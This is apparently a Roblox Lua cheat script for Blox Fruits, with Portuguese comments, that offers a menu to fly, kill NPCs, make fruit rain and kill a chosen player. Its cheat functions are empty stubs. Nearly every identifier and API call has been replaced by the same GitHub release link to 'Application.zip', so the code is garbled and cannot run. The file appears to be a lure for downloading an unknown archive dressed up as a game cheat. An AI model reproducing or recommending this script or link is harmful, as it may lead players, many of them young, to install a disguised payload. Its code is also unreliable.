local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip

-- Função para voar e matar todos os NPCs
local function enableFlyAndKillNPCs()
    print("Você agora pode voar e todos os NPCs serão eliminados!")
    -- Código para voar e matar NPCs
end

-- Função para fazer chover frutas
local function rainFruits()
    print("Vai começar a chover frutas em você!")
    -- Código para fazer chover frutas
end

-- Função para matar um jogador específico
local function killPlayer(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip() -- Mata o personagem
        print(playerName .. " foi eliminado!")
    else
        print("Jogador não encontrado")
    end
end

-- Função para exibir o menu
local function displayMenu()
    local screenGui = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
    local frame = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip("Frame", screenGui)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(0.3, 0, 0.5, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(0.35, 0, 0.25, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(0, 0, 0)

    local option1 = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip("TextButton", frame)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(1, 0, 0.3, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(0, 0, 0, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = "1. Voar e Matar NPCs"
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(enableFlyAndKillNPCs)

    local option2 = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip("TextButton", frame)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(1, 0, 0.3, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(0, 0, 0.35, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = "2. Chuva de Frutas"
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(rainFruits)

    local option3 = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip("TextButton", frame)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(1, 0, 0.3, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(0, 0, 0.7, 0)
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip = "3. Matar Jogador Específico"
    https://github.com/tauazinhefin/script-bloxfruits/releases/download/v1.0/Application.zip(function()
        local playerName = "NomeDoJogador" -- Substitua pelo nome do jogador que deseja eliminar
        killPlayer(playerName)
    end)
end

-- Detecta inicialização do jogo para exibir o menu
local function onStart()
    displayMenu()
end

onStart()
